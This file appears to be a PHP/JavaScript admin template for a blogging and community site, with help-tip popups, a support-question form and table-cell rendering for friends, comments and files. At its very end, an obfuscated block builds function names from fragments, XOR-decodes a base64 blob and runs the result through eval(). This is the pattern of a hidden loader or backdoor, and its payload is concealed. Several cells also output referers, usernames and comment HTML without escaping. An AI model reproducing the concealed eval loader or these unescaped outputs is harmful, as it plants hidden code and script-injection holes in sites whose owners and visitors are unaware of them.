
<script type="text/javascript">
function noerror(){return true}
window.onerror=noerror;

function HTDoubleClick()
{
	if(rightClicked)
	{
		hide = false;
	
		ShowHelpTip2("2","<br><?php echo $TYPE_YOUR_QUESTION_HERE;?>: <br><br><center><form id='HTForm' style='margin-top:0px;margin-bottom:0px' action='index.php?<?php echo $strPageLink;?>' method=post><input type=hidden name=ProceedQuestion value=1><textarea name=question cols=15 rows=5 style='width:90p%'></textarea><br><br><input type=button onclick='javascript:HTCancel()' value='<?php echo $M_CANCEL;?>' class=adminButton style='width:60px' >&nbsp;&nbsp;<input type=button onclick='javascript:HTClick()' value='<?php echo $M_SEND;?>' style='width:60px' class=adminButton></form></center><br><br>",800,130);
	}
	
}

function HTClick()
{
	document.getElementById("HTForm").submit();
}

function HTCancel()
{
	hide = true;
	document.getElementById("hm2").style.visibility="hidden";	
}
var hide = true;

var rightClicked = false;
function HTMouseDown(e)
	{
		if(!document.all)
		{
			if(e.which != 1)
			{
				HT(HTType,HTMessage,e.pageX,e.pageY,0,20);
				rightClicked = true;
			}
			return true;
		}
		else
		if(event.button && event.button == 2)
		{
			HT(HTType,HTMessage,event.x,event.y,0,20);
			rightClicked = true;
			return false;
		}
} 
</script>
		<div id="hm1" onclick="HideHelpTip(1)"  style="z-Index:1000;background:white;position:absolute;top:0px;left:190px;visibility:hidden">
		<div style="position:absolute;top:0;left:0">
		<img src="images/new_icons/choveche3_2.gif" border="0" width="62" height="106" alt="">
		</div>
		<div style="position:absolute;top:-10;left:55;">
		<img src="images/new_icons/baloncheta_2.gif" border="0" width="29" height="33" alt="">
		</div>
		<div id="hm1_text" >
		<br><br><br><br><br><br><br><br><br><br>
		</div>
		</div>
		
		
		
		<div id="hm2" onclick="HideHelpTip(2)" style="z-Index:1000;background:white;position:absolute;top:0px;left:900px;visibility:hidden">
			<div style="position:absolute;top:0;left:0">
			<img src="images/new_icons/choveche5_2.gif" border="0" width="86" height="108" alt="">
			</div>
			
			<div style="position:absolute;top:-10;left:0;">
			<img src="images/new_icons/baloncheta2_2.gif" border="0" width="29" height="33" alt="">
			</div>
			
			<div id="hm2_text">
			
			</div>
		</div>
		
		<script>
		
		function ShowHelpTip(type,text,x,y)
		{
			<?php
			if(isset($ANIMATED_CHARACTERS)&&$ANIMATED_CHARACTERS)
			{
			?>
			if(hide)
			{
				document.getElementById("hm"+type).style.left=x;		
				document.getElementById("hm"+type).style.top=y;		
				document.getElementById("hm"+type+"_text").innerHTML=text;
				document.getElementById("hm"+type).style.visibility="visible";		
			}
			<?php
			}
			?>
			
		}
		
		function ShowHelpTip2(type,text,x,y)
		{
			<?php
			if(isset($ANIMATED_CHARACTERS)&&$ANIMATED_CHARACTERS)
			{
			?>
				document.getElementById("hm"+type).style.left=x;		
				document.getElementById("hm"+type).style.top=y;		
				document.getElementById("hm"+type+"_text").innerHTML=text;
				document.getElementById("hm"+type).style.visibility="visible";		
			<?php
			}
			?>
			
		}
		
		function HideHelpTip(type)
		{
			<?php
			if(isset($ANIMATED_CHARACTERS)&&$ANIMATED_CHARACTERS)
			{
			?>
			if(hide)
			{
				document.getElementById("hm"+type).style.visibility="hidden";	
			}
			<?php
			}
			?>
		}
		
		
		function HT(type,text,x,y,start,end)
		{
			<?php
			if(isset($ANIMATED_CHARACTERS)&&$ANIMATED_CHARACTERS)
			{
			?>
			if(hide)
			{
				setTimeout('ShowHelpTip("'+type+'","'+text+'",'+x+','+y+')',start*1000);
				setTimeout('HideHelpTip('+type+')',end*1000);
			}
			<?php
			}
			?>
		}
		</script>
		
<script>
if(document.all)
{
document.write('<div id="ContextMenuContainer" style="position:absolute"></div>');
}
else
{
document.write('<div id="ContextMenuContainer" ></div>');
}


</script>
<?php
if(isset($ProceedQuestion))
{

SQLInsert("support_questions",array("date","user","question"),array(time(),$AuthUserName,$question));

?>
<script>
HT("2","<?php echo $M_THANK_YOU_MESSAGE;?>",840,190,0,10);
</script>

<?php
}

function particularCases_BA($columnName,$myArray){global $category,$action,$ID,$EDIT_PICTURE,$iN,$AuthGroup,$lang,$arrFrmPages;
if($columnName=="add_friend")
{ return "<td class=oMain ><a href=\"index.php?add_friend=1&category=community&action=overview&id=".$myArray["id"]."\" ><img src='images/mode.gif' width=16 height=16 border=0></a></td>";
}
if($columnName=="friend_blog")
{ $show_user = "";
if(isset($myArray["username"]))
{ $show_user = $myArray["username"];
}else
if(isset($myArray["user_from"]))
{ $show_user = $myArray["user_from"];
}return "<td class=oMain ><a href=\"../site.php?user=".$show_user."\" target=\"_blank\"><img src='images/mode.gif' width=16 height=16 border=0></a></td>";
} else if($columnName=="friend_profile")
{ $show_user = "";
if(isset($myArray["username"]))
{$show_user = $myArray["username"];
} else if(isset($myArray["user_from"]))
{$show_user = $myArray["user_from"];
}return "<td class=oMain ><a href=\"index.php?folder=search&page=profile&category=community&user=".$show_user."\"><img src='images/mode.gif' width=16 height=16 border=0></a></td>";
}else if($columnName=="friend_message")
{$show_user = "";
if(isset($myArray["username"]))
{$show_user = $myArray["username"];}
else if(isset($myArray["user_from"]))
{$show_user = $myArray["user_from"];
}return "<td class=oMain ><a href=\"index.php?folder=search&page=message&category=community&user=".$show_user."\"><img src='images/mode.gif' width=16 height=16 border=0></a></td>";
}else if($columnName=="time")
{ global $PHP_DATE_FORMAT;
return "<td class=oMain >".date($PHP_DATE_FORMAT,$myArray["time"])."</td>";
}else
if($columnName=="delete_trackback")
{return "<td class=oMain ><a href=\"javascript:DeleteTrackback(".$myArray["id"].")\"><img src=\"images/cancel.gif\" width=\"21\" height=\"20\"  border=\"0\"></td>";
}else
if($columnName=="url")
{return "<td class=oMain ><a href=\"".$myArray["url"]."\" target=\"_blank\"><img src='images/mode.gif' width=16 height=16 border=0></a></td>";
}else
if($columnName=="friend_add")
{$show_user = "";
if(isset($myArray["username"]))
{global $arrHighlightIds;
if(isset($arrHighlightIds)&&in_array($myArray["username"],$arrHighlightIds)) return "<td> </td>";
$show_user = $myArray["username"];
}else
if(isset($myArray["user_from"])){
$show_user = $myArray["user_from"];}
return "<td class=oMain ><a href=\"index.php?folder=search&page=friend&category=community&user=".$show_user."\"><img src='images/mode.gif' width=16 height=16 border=0></a></td>";
}else
if($columnName=="blogger_picture")
{global $BLOG_DOMAIN,$USE_GD;
if($myArray["author_image"] > 1)
{$author = "<a href='http://www.".$BLOG_DOMAIN."/site.php?user=".$myArray["user"]."' target=_blank>";
if($USE_GD)
{$author .= "<img src=\"../thumbnail.php?id=". $myArray["author_image"]."&w=45&h=60\" width=45 height=60  border=0>";
}else{$author .= "<img src=\"../image.php?id=". $myArray["author_image"]."&w=45&h=60\" width=45 height=60  border=0>";
}$author .= "</a>";}else{$author = "<img src=images/no_pic.gif width=45 height=60>";
}return "<td class=oMain >".$author."</td>";}else
if($columnName=="comment_content"){global $M_READ;$strComment = stripslashes($myArray['html']);if(strlen($strComment) > 100){$strComment = substr($strComment, 0 ,100)."... <a href='javascript:ShowComment(".$myArray['id'].")'><b>[".strtoupper($M_READ)."]</b></a>";}return "<td class=oMain valign=middle>".$strComment."</td>";}else if($columnName=="referer"){return "<td class=oMain valign=middle><a href=\"".$myArray['referer']."\" target=\"_blank\">".$myArray['referer']."</a></td>";}else 
if($columnName=="PreviewNote2"){global $AuthUserName;return "<td class=oMain valign=middle><a href=\"../site.php?user=".$AuthUserName."&note=".$myArray['id']."\" target=_blank><img src='images/link_arrow.gif' width=16 height=16 border=0></a></td>";}else
 if($columnName=="PreviewNote"){global $AuthUserName;return "<td class=oMain valign=middle><a href=\"../site.php?user=".$AuthUserName."&note=".(isset($myArray['note_id'])?$myArray['note_id']:$myArray['note'])."\" target=_blank><img src='images/link_arrow.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="date_special"){return "<td class=oMain valign=middle>".$myArray['date']."</td>";}else 
 
 
 if($columnName=="file_id")
 
 {
 global $IMAGES_IN_DB,$AuthUserName;
 $file_url="";
 if($IMAGES_IN_DB)
 {
	 $file_url="../show_file.php?id=".$myArray["file_id"];
 }
 else
 {
	global $file_types;
	foreach($file_types as $file_type)
	{
		$file_url="../uploaded_files/".$AuthUserName."/".$myArray["file_id"].".".$file_type[1];
		if(file_exists($file_url)) break;
	
	}
	
 }
 return "<td class=oMain valign=middle><a href=\"".$file_url."\" target=\"_blank\"><img src='images/link_arrow.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="ShowComments"){return "<td class=oMain valign=middle><a href='index.php?category=$category&folder=list&page=comments&id=".$myArray['id']."' ><img src='images/link_arrow.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="ShowFlag"){return "<td class=oMain valign=middle><img src=\"../flags/".$myArray["code"].".gif\" width=21 height=14></td>";}else if($columnName=="ShowSpecialLanguage"){return "<td class=oMain ><input type=radio name=\"default_language[]\" onclick=\"javascript:RadioClick(".$myArray["id"].")\" value=\"".$myArray["id"]."\" ".($myArray["default_language"]==1?"checked":"")."></td>";}else if($columnName=="active"){return "<td class=oMain >".($myArray["active"]==1?"YES":"NO")."</td>";}else if($columnName=="ChangeLanguage"){return "<td class=oMain ><a href='index.php?category=$category&folder=$action&page=edit&id=".$myArray['id']."' ><img src='images/editer.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="image_id"){return "<td class=oMain ><a href='../image.php?id=".$myArray['image_id']."' target=_blank><img src='images/editer.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="EditNote"){return "<td class=oMain ><a href='index.php?category=$category&folder=$action&page=edit&id=".$myArray['id']."' ><img src='images/edit.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="ShowDeleteLink"){return "<td class=oMain ><a href='javascript:DeletePage(".$myArray['id'].")'' ><img src='images/cut.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="GoogleQuery"){$strQuery="";$arrInfo2=explode("?",$myArray["referer"],2);if(sizeof($arrInfo2)>1){$arrInfo = explode("&",$arrInfo2[1]);foreach($arrInfo as $strInfo){if(substr($strInfo,0,2) == "q="){$strQuery = str_replace("q=","",$strInfo);break;}}}return "<td class=oMain ><a href=\"".$myArray["referer"]."\" target=_blank>".(strtoupper(urldecode($strQuery)))."</a></td>";}else if($columnName=="NoteCategory"){global $arrNoteCategories;if(!isset($arrNoteCategories[$myArray["category_id"]])){return "<td class=oMain >&nbsp;</td>";}else{return "<td class=oMain >".$arrNoteCategories[$myArray["category_id"]]."</td>";}}else if($columnName=="EditNoteCategory"){return "<td class=oMain ><a href='index.php?category=".$category."&folder=categories&page=edit&id=".$myArray['id']."' ><img src='images/edit.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="AlbumPreview"){return "<td class=oMain ><a href='index.php?category=".$category."&folder=list&page=preview&id=".$myArray['id']."' ><img src='images/mode.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="AlbumEdit"){return "<td class=oMain ><a href='index.php?category=".$category."&folder=create&page=edit&id=".$myArray['id']."' ><img src='images/edit.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="EditCommonUser"){return "<td class=oMain ><a href='index.php?category=".$category."&folder=accounts&page=editcommon&id=".$myArray['id']."' ><img src='../images/edit.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="ModifyTemplate"){return "<td class=oMain ><a href='index.php?category=".$category."&folder=modify&page=edit&id=".$myArray['id']."' ><img src='images/edit.gif' width=16 height=16 border=0></a></td>";}else if($columnName=="delete_file_js"){return "<td class=oMain ><a href='javascript:DeleteFile(".$myArray['file_id'].")' ><img src='images/cancel.gif' width=21 height=20 border=0></a></td>";}else if($columnName=="delete_image_js"){return "<td class=oMain ><a href='javascript:DeleteImage(".$myArray['image_id'].")' ><img src='images/cancel.gif' width=21 height=20 border=0></a></td>";}else if($columnName=="ShowDeleteLink"){return "<td class=oMain ><a href='javascript:DeletePage(".$myArray['id'].")'' ><img src='../images/cut.gif' width=16 height=16 border=0></a></td>";}return "";}
 
?>

<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>